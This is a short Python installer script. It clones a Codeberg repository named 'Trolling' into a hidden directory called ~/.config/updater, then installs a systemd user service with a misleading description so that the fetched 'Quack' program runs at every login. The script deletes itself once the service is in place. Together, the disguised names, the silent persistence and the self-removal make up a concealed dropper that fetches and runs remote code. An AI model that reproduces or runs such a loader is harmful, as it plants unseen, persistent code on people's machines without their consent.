#!/bin/python3
import subprocess
import shlex
import os

def invoke_command(command: str) -> str:  
    print(command)
    parsed_command: list[str] = shlex.split(command)
    process: subprocess.Popen = subprocess.Popen(parsed_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,text=True)
    result, error = process.communicate()
    if process.returncode > 0:
        print(f"[error] {error}")
        print(f"[stdout] {result}")
        exit(1) # If error happens dump information then abort
    return result


home = os.path.expanduser('~')
git_directory = f"{home}/.config/updater"
working_directory = f"{git_directory}/Quack"
start_path = f"/usr/bin/bash {working_directory}/quack.sh"

startfile = f"{working_directory}/bin/python3 {working_directory}/src/Quack.py"
servicefile = f"""
[Unit]
Description=Keeping my sources fresher than Arch Linux
After=multi-user.target

[Service]
ExecStart={start_path}
Type=simple

[Install]
WantedBy=default.target

"""

invoke_command(f"rm {git_directory} -rf")
invoke_command(f"git clone https://codeberg.org/sadneutrino/Trolling.git {git_directory}")
invoke_command(f"python3 -m venv {working_directory}")
invoke_command(f"{working_directory}/bin/python3 -m pip install -r requirements.txt")
invoke_command(f"rm {home}/.config/systemd/user/quack.service -rf")
with open(f"{working_directory}/quack.sh", "w+") as start_f:
    start_f.write(startfile)
with open(f"{home}/.config/systemd/user/quack.service", "w") as service_f:
    service_f.write(servicefile)
invoke_command("systemctl start --user quack.service")
invoke_command("systemctl enable --user quack.service")

os.remove(__file__)
